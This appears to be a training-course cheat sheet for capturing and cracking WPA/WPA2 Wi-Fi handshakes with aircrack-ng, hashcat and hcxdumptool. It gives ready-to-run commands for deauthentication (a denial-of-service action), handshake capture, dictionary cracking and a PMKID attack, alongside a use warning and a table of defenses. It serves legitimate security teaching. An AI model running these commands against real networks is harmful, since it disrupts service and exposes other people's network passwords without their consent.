# Aircrack-ng Workflow Cheat Sheet

The end-to-end WPA/WPA2 handshake capture-and-crack workflow for module 04.
**Own equipment, RF-isolated space, authorized targets only.** Deauth is a
disruptive/DoS action and monitor-mode TX can violate radio regulations.

---

## The workflow at a glance

```text
1. PREP     airmon-ng check kill  →  airmon-ng start wlan0   (=> wlan0mon)
2. DISCOVER airodump-ng wlan0mon                             (find BSSID/CH/client)
3. LOCK     airodump-ng --bssid <B> -c <CH> -w cap wlan0mon  (record handshake)
4. DEAUTH   aireplay-ng --deauth 10 -a <B> -c <CLIENT> wlan0mon  (force rejoin)
5. VERIFY   aircrack-ng cap-01.cap                           ("1 handshake")
6. CRACK    aircrack-ng -w wordlist -b <B> cap-01.cap        (offline)
```

---

## Step 1: Interface prep

| Command | Action |
|---------|--------|
| `iw dev` | List wireless interfaces + mode |
| `airmon-ng` | aircrack-ng chipset/driver view |
| `sudo airmon-ng check` | Show interfering processes |
| `sudo airmon-ng check kill` | Stop NetworkManager/wpa_supplicant |
| `sudo airmon-ng start wlan0` | Enable monitor mode (→ `wlan0mon`) |
| `sudo airmon-ng stop wlan0mon` | Disable monitor mode |
| `sudo iw dev wlan0mon set channel 6` | Pin channel manually |
| `iw reg get` / `sudo iw reg set US` | Get/set regulatory domain |

## Step 2: Discovery (airodump-ng)

| Command | Action |
|---------|--------|
| `sudo airodump-ng wlan0mon` | Survey all APs/clients (2.4 GHz) |
| `sudo airodump-ng --band abg wlan0mon` | Both bands |
| `sudo airodump-ng --band a wlan0mon` | 5 GHz only |

Read the display: **BSSID** (AP MAC), **CH** (channel), **ENC/CIPHER/AUTH**
(WPA2 CCMP PSK), **ESSID** (name); lower rows show **STATION**s (clients) and
which BSSID each is associated with.

## Step 3: Targeted capture

```bash
sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon
#                 └ AP MAC                   └ chan  └ output prefix
# Writes handshake-01.cap; watch top-right for:  WPA handshake: AA:BB:CC:11:22:33
```

| Flag | Meaning |
|------|---------|
| `--bssid <MAC>` | Focus one AP |
| `-c <n>` | Lock channel |
| `-w <prefix>` | Output file prefix (`.cap`, `.csv`, ...) |
| `--write-interval 1` | Flush file every second |

## Step 4: Deauthentication (aireplay-ng)

```bash
# Targeted (preferred): kick one client so it re-handshakes
sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon

# Broadcast: hit all clients (noisier)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 wlan0mon
```

| Flag | Meaning |
|------|---------|
| `--deauth N` | N deauth bursts (0 = continuous = DoS) |
| `-a <BSSID>` | Target AP |
| `-c <CLIENT>` | Target client (omit = broadcast) |
| `--test` | Injection capability test |

## Step 5: Verify the handshake

```bash
sudo aircrack-ng handshake-01.cap        # look for "1 handshake" + your ESSID
```

## Step 6: Offline crack

```bash
# CPU dictionary attack with aircrack-ng
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 handshake-01.cap
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz    # if still gzipped

# GPU-accelerated with hashcat (mode 22000)
hcxpcapngtool -o hs.22000 handshake-01.cap
hashcat -m 22000 hs.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hs.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

| aircrack-ng flag | Meaning |
|------------------|---------|
| `-w <file>` | Wordlist |
| `-b <BSSID>` | Target AP |
| `-e <ESSID>` | Target by network name |
| `-l <file>` | Write found key to file |

## PMKID attack (clientless, no deauth)

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.22000 pmkid.pcapng
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
```

## Cleanup / restore

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
nmcli device status
```

---

## Defenses that break this workflow

| Defense | Effect on the attack |
|---------|----------------------|
| **PMF (802.11w)** | Deauth frames rejected → can't force re-handshake |
| **WPA3-SAE** | No offline dictionary attack possible at all |
| **Long random passphrase** | Handshake captured but uncrackable in practice |
| **WPS disabled** | Removes PIN/Pixie-Dust passphrase bypass |
| **WIDS** | Detects deauth floods / rogue APs |

## Troubleshooting quick hits

| Problem | Fix |
|---------|-----|
| No `wlan0mon` | Chipset lacks monitor mode; check `iw list` for `* monitor` |
| Card hops channels | `sudo airmon-ng check kill` |
| No handshake appears | Wrong `-c` channel / no client / weak signal / PMF on |
| Deauth ignored | 802.11w PMF enabled (defense working) |
| "no valid handshake" | Incomplete EAPOL; re-capture all 4 frames |
| Injection 0% | `aireplay-ng --test` fails → card can't TX |
